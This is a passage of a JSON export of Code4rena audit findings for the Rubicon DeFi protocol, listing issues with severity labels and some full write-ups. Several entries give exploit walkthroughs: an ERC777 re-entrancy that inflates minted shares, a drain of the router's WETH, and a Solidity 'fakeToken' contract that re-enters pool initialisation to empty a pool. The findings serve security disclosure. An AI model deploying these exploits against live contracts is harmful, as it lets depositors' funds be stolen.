bonusTokens.push(newBonusERC20);   } ```   "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/449", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/447", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/444", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "Multiple Unsafe Arithmetic Operations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/443", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L844 https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L857 https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L883 https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L898 https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L927 https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L951   # Vulnerability details  ## RMT-02M: Multiple Unsafe Arithmetic Operations  | File | Lines | Type | | :- | :- | :- | | RubiconMarket.sol | [L844](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L844), [L857](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L857), [L883](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L883), [L898](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L898), [L927](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L927), [L951](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconMarket.sol#L951) | Mathematical Operations |  ### Description  The referenced lines all perform unsafe multiplications using the unitary denominations of either `1 ether` (`1e18`) or `10**9` (`1e9`), both of which can easily lead to overflows when used as a multiplier for large amounts of assets.  ### Impact  Purchasing and selling amounts will be improperly fulfilled as well as improperly tracked as \"sold out\" / \"bought out\".  ### Solution (Recommended Mitigation Steps)  We advise the codebase to make use of the `mul` operation exposed by the `DSMath` library already incorporated into the codebase to guarantee all operations are performed safely and cannot overflow.  ### PoC  Issue is deducible by inspecting the relevant lines referenced in the issue and making note of the raw multiplication (`*`) operations performed.  ### Tools  Manual inspection of the codebase.  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/440", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/439", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/438", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/435", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "RubiconMarketAddress in BathPair can't be updated", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/434", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2022-05-rubicon-findings", "body": "RubiconMarketAddress in BathPair can't be updated"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/431", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/430", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/424", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/421", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/420", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/418", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/416", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/414", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/413", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/409", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/406", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/404", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "First depositor can break minting of shares", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/397", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "First depositor can break minting of shares"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/396", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/394", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/392", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/391", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "`BathToken` does not conform to EIP4626 implementation or specification", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/387", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-05-rubicon-findings", "body": "`BathToken` does not conform to EIP4626 implementation or specification"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/386", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/380", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/379", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "RubiconRouter maxSellAllAmount does not trasnfer user's fund into its address, causing calls to always revert", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/376", "labels": ["bug", "2 (Med Risk)"], "target": "2022-05-rubicon-findings", "body": "RubiconRouter maxSellAllAmount does not trasnfer user's fund into its address, causing calls to always revert"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/366", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/363", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/361", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/360", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/359", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "```withdrawForETH``` could be used to drain the WETH in ```RubiconRouter.sol```", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/356", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "# Lines of code  [RubiconRouter.sol#L475-L492](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L475-L492)   # Vulnerability details  ## Impact  In the ```withdrawForETH``` function in ```RubiconRouter.sol```, the ```targetPool``` may be any contract that implements the ```IBathToken``` interface and returns ```wethAddress``` as its underlying token. The ```withdrawnWETH``` amount could be set to the ```RubiconRouter.sol``` contract's WETH balance so that the contract's entire WETH balance is withdrawn, as long as the ```tagetPool``` does not transfer any WETH to ```RubiconRouter.sol```. The caller of the ```withdrawForETH``` function would then receive the withdraw amount.  ## Proof of Concept  ```     function withdrawForETH(uint256 shares, address targetPool)         external         payable         returns (uint256 withdrawnWETH)     {         IERC20 target = IBathToken(targetPool).underlyingToken();         require(target == ERC20(wethAddress), \"target pool not weth pool\");         require(             IBathToken(targetPool).balanceOf(msg.sender) >= shares,             \"don't own enough shares\"         );         IBathToken(targetPool).transferFrom(msg.sender, address(this), shares);         withdrawnWETH = IBathToken(targetPool).withdraw(shares);         WETH9(wethAddress).withdraw(withdrawnWETH);          //Send back withdrawn native eth to sender         msg.sender.transfer(withdrawnWETH);     } ```  1. Let ```shares``` be equal to the contracts WETH balance.  2. The malicious ```targetPool``` contract returns the ```wethAddress``` as the underlying token on [line 480](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L480).   3. ```targetPool``` returns the max uint256 value for its balanceOf function to pass the require condition on [line 483](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L483) for any value of shares.  4. The transferFrom on [line 486](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L486) does not have to do anything and its withdraw function should return the WETH balance of ```RubiconRouter.sol```.  5. The ```RubiconRouter.sol``` contract will then [withdraw ETH](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/RubiconRouter.sol#L488) equal to the ```withdrawWETH``` amount, which should be equal to the contract's WETH balance.  6. The caller of the ```withdrawForETH``` function receives the withdraw ETH without providing any WETH.   ## Recommended Mitigation Steps:  Check the contract's WETH balance before the caller is supposed to send the WETH and after the WETH is sent to confirm the contract has received enough WETH from the caller.  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/354", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/353", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/351", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "`BathToken.sol#_deposit()` attacker can mint more shares with re-entrancy from hookable tokens", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/350", "labels": ["bug", "duplicate", "3 (High Risk)", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L557-L568   # Vulnerability details  `BathToken.sol#_deposit()` calculates the actual transferred amount by comparing the before and after balance, however, since there is no reentrancy guard on this function, there is a risk of re-entrancy attack to mint more shares.  Some token standards, such as ERC777, allow a callback to the source of the funds (the `from` address) before the balances are updated in `transferFrom()`. This callback could be used to re-enter the function and inflate the amount.  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L557-L568  ```solidity function _deposit(uint256 assets, address receiver)     internal     returns (uint256 shares) {     uint256 _pool = underlyingBalance();     uint256 _before = underlyingToken.balanceOf(address(this));      // **Assume caller is depositor**     underlyingToken.transferFrom(msg.sender, address(this), assets);     uint256 _after = underlyingToken.balanceOf(address(this));     assets = _after.sub(_before); // Additional check for deflationary tokens     ... ```  ### PoC  With a ERC777 token by using the ERC777TokensSender `tokensToSend` hook to re-enter the `deposit()` function.  Given:   -   `underlyingBalance()`: `100_000e18 XYZ`. -   `totalSupply`: `1e18`  The attacker can create a contracts with `tokensToSend()` function, then:  1.   `deposit(1)`     -   preBalance  = `100_000e18`;     -   `underlyingToken.transferFrom(msg.sender, address(this), 1)` 2. reenter using `tokensToSend` hook for the 2nd call: `deposit(1_000e18)`     -   preBalance  = `100_000e18`;     -   `underlyingToken.transferFrom(msg.sender, address(this), 1_000e18)`     -   postBalance = `101_000e18`;     -   assets (actualDepositAmount) = `101_000e18 - 100_000e18 = 1_000e18`;     -   mint `1000` shares; 3. continue with the first `deposit()` call:     -   `underlyingToken.transferFrom(msg.sender, address(this), 1)`     -   postBalance = `101_000e18 + 1`;     -   assets (actualDepositAmount) = `(101_000e18 + 1) - 100_000e18 = 1_000e18 + 1`;     -   mint `1000` shares;  As a result, with only `1 + 1_000e18` transferred to the contract, the attacker minted `2_000e18 XYZ` worth of shares.  ### Recommendation  Consider adding `nonReentrant` modifier from OZ's `ReentrancyGuard`.   "}, {"title": "BathToken stake holders may not be able to `withdraw` as `outstandingAmount` can not be liquidated permissionless", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/348", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-05-rubicon-findings", "body": "BathToken stake holders may not be able to `withdraw` as `outstandingAmount` can not be liquidated permissionless"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/347", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/345", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "Centralization risk - admin has too much control over protocol.", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/344", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-05-rubicon-findings", "body": "Centralization risk - admin has too much control over protocol."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/340", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "`RubiconMarket.sol#isClosed()` always returns false, making the market can not be stopped as designed", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/339", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L471-L473   # Vulnerability details  ```solidity     function isClosed() public pure returns (bool closed) {         return false;     } ```  > After close, no new buys are allowed.  Based on context and comments, when the market is closed, offers can only be cancelled (offer and buy will throw).   However, in the current implementation, `isClosed()` always returns `false`, so the checks on whether the market is closed will always pass. (E.g: `can_offer()`, `can_buy()`, etc)  And there is a storage variable called `stopped`, but it's never been used, which seems should be used for `isClosed`.  ### Recommendation  Change to:  ```solidity     function isClosed() public pure returns (bool closed) {         return stopped;     } ```  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/338", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "`BathPair.sol#rebalancePair()` can be front run to steal the pending rebalancing amount", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/337", "labels": ["bug", "duplicate", "3 (High Risk)", "sponsor disputed"], "target": "2022-05-rubicon-findings", "body": "`BathPair.sol#rebalancePair()` can be front run to steal the pending rebalancing amount"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/333", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "Changing `matchingEnabled` in `RubiconMarket` breaks protocol", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/329", "labels": ["bug", "2 (Med Risk)", "sponsor disputed"], "target": "2022-05-rubicon-findings", "body": "Changing `matchingEnabled` in `RubiconMarket` breaks protocol"}, {"title": "Malicious pools can be deployed through `BathHouse`", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/326", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathHouse.sol#L153 https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L214   # Vulnerability details  ## Title Malicious pools can be deployed through `BathHouse`  ## Impact Reentrancy in `BathToken.initialize()` can be exploited and this allows to create a pool which has a legitimate underlying token (even one for which a pool already exists), and has given full approval of underlying Token to an attacker. While this underlying token will differ from the one returned by  `BathHouse.getBathTokenfromAsset` for that Pool (since the returned token would be the malicious one which reentered `initialize`), the LPs could still deposit actual legitimate tokens to the pool since it is deployed from the BathHouse and has the same name as a legit pool, and loose their deposit to the attacker.  ## Proof of Concept Create a new pool calling `BathHouse.openBathTokenSpawnAndSignal()` and passing as `newBathTokenUnderlying` the address with the following malicious token:  ```solidity // SPDX-License-Identifier: BUSL-1.1  pragma solidity =0.7.6;  import \"@openzeppelin/contracts/token/ERC20/ERC20.sol\"; import \"@openzeppelin/contracts/access/Ownable.sol\"; import \"../../contracts/rubiconPools/BathToken.sol\";  contract fakeToken is ERC20(\"trueToken\", \"TRUE\"), Ownable {      ERC20 trueToken;     address marketAddress;     uint256 counterApprove;     BathToken bathToken;      function setTrueToken(address _trueTokenAddress) onlyOwner {         trueToken = ERC20(_trueTokenAddress);     }      function setMarketAddress(address _marketAddress) onlyOwner {         marketAddress = _marketAddress;     }      function approve(address spender, uint256 amount) public virtual override returns (bool) {         if (counterApprove == 1) { //first approve is from bathHouse             bathToken = BathToken(msg.sender);             bathToken.initialize(trueToken, owner, owner);             attacked = false;         }         counterApprove++;         _approve(_msgSender(), spender, amount);         return true;     }      function setAndApproveMarket(address _market){         // sets legitimate market after malicious bathToken initialization         bathToken.setMarket(_market);         bathToken.approveMarket();     }      function emptyPool() onlyOwner {         // sends pool tokens to attacker         uint256 poolBalance = trueToken.balanceOf(address(bathToken));         trueToken.transferFrom(address(bathToken), owner, poolBalance);     } } ```  This reenters `BathToken.initialize()` and reassigns the bathHouse role to the fake token, which names itself as the legit token. Also the reentrant call reassigns the legit Token to `underlyingToken` so thet the pool actually contains the legit token, but gives infinite approval for the legit token from the pool to the attacker, who is passed as `market` in the reentrant call.  Since the fakeToken has the bathHouse role, it can set the market to the actual RubiconMarket after the reentrant call.  Code: [BathHouse.openBathTokenSpawnAndSignal](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathHouse.sol#L153), [BathToken.initialize](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L214)  ## Tools Used Manual analysis  ## Recommended Mitigation Steps Add `onlyBathHouse` modifier to `initialize` function in `BathToken` to avoid reentrancy from malicious tokens.  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/321", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "`RubiconMarket.feeTo` set to zero-address can DoS `buy` function", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/319", "labels": ["bug", "2 (Med Risk)", "sponsor disputed"], "target": "2022-05-rubicon-findings", "body": "`RubiconMarket.feeTo` set to zero-address can DoS `buy` function"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/318", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "`RubiconMarket` buys can not be disabled if offer matching is disabled", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/317", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L962   # Vulnerability details  ## Impact  In the `RubiconMarket` contract, buys can be disabled with `setBuyEnabled`. However, if `matchingEnabled` is set to `false`, buys can not be disabled as the `require` check is located in the `_buys` function instead of checking `buyEnabled` in the `buy` function.  ## Proof of Concept  [RubiconMarket.sol#L962](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L962)  ```solidity function _buys(uint256 id, uint256 amount) internal returns (bool) {     require(buyEnabled); // @audit-info Buys can not be disabled if offer matching is disabled - this require statement should be moved to `buy` function     if (amount == offers[id].pay_amt) {         if (isOfferSorted(id)) {             //offers[id] must be removed from sorted list because all of it is bought             _unsort(id);         } else {             _hide(id);         }     }      require(super.buy(id, amount));      // If offer has become dust during buy, we cancel it     if (         isActive(id) &&         offers[id].pay_amt < _dust[address(offers[id].pay_gem)]     ) {         dustId = id; //enable current msg.sender to call cancel(id)         cancel(id);     }     return true; } ```  ## Tools Used  Manual review  ## Recommended mitigation steps  Move the `require` check for `buyEnabled` to the `buy` function [here](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconMarket.sol#L662).  "}, {"title": "Use `safeTransfer()`/`safeTransferFrom()` instead of `transfer()`/`transferFrom()`", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/316", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-05-rubicon-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L251   # Vulnerability details  ## Impact  It is a good idea to add a `require()` statement that checks the return value of ERC20 token transfers or to use something like OpenZeppelin\u2019s `safeTransfer()`/`safeTransferFrom()` unless one is sure the given token reverts in case of a failure. Failure to do so will cause silent failures of transfers and affect token accounting in contract.  However, using `require()` to check transfer return values could lead to issues with non-compliant ERC20 tokens which do not return a boolean value. Therefore, it's highly advised to use OpenZeppelin\u2019s `safeTransfer()`/`safeTransferFrom()`.  ## Proof of Concept  **RubiconRouter.sol**  [L251](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L251): `ERC20(route[route.length - 1]).transfer(to, currentAmount);`\\ [L303](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L303): `ERC20(buy_gem).transfer(msg.sender, fill);`\\ [L320](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L320): `ERC20(buy_gem).transfer(msg.sender, fill);`\\ [L348](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L348): `ERC20(buy_gem).transfer(msg.sender, buy_amt);`\\ [L377](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L377): `ERC20(pay_gem).transfer(msg.sender, max_fill_amount - fill);`\\ [L406](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L406): `ERC20(buy_gem).transfer(msg.sender, _after - _before);`\\ [L471](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L471): `ERC20(targetPool).transfer(msg.sender, newShares);`  **peripheral_contracts/BathBuddy.sol**  [L114](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/peripheral_contracts/BathBuddy.sol#L114): `token.transfer(recipient, amountWithdrawn);`  **rubiconPools/BathPair.sol**  [L601](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathPair.sol#L601): `IERC20(asset).transfer(msg.sender, booty);`\\ [L615](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathPair.sol#L615): `IERC20(quote).transfer(msg.sender, booty);`  **rubiconPools/BathToken.sol**  [L353](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L353): `IERC20(filledAssetToRebalance).transfer(`\\ [L357](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L357): `IERC20(filledAssetToRebalance).transfer(msg.sender, stratReward); `\\ [L602](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L602): `underlyingToken.transfer(feeTo, _fee);`\\ [L605](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L605): `underlyingToken.transfer(receiver, amountWithdrawn);`  ## Tools Used  Manual review  ## Recommended mitigation steps  Consider using `safeTransfer()`/`safeTransferFrom()` instead of `transfer()`/`transferFrom()`.  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/310", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/306", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/304", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/300", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/298", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/297", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/293", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/288", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-rubicon-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/287", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/285", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/284", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-rubicon-findings", "body": "QA Report"}, {"title": "Possible token 